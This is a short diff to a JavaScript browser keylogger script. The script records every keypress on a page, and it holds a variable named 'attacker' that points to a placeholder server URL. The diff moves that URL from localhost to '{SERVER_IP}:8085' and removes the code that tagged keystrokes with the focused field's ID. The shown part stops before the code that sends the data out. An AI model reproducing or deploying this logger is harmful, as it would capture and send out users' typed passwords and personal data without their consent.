@@ -1,13 +1,5 @@
 var keys = '';
-var attacker = 'http://localhost:8080/k?c=';
-
-var inputs = document.querySelectorAll('input,textarea');
-
-for (var i = 0; i < inputs.length; i++) {
-    inputs[i].addEventListener('focus', function() {
-        keys += '\nIn ' + document.activeElement.id + ': ';
-    });
-}
+var attacker = 'http://{SERVER_IP}:8085/k?c=';
 
 document.addEventListener('keypress', function(e) {
     keys += e.key;
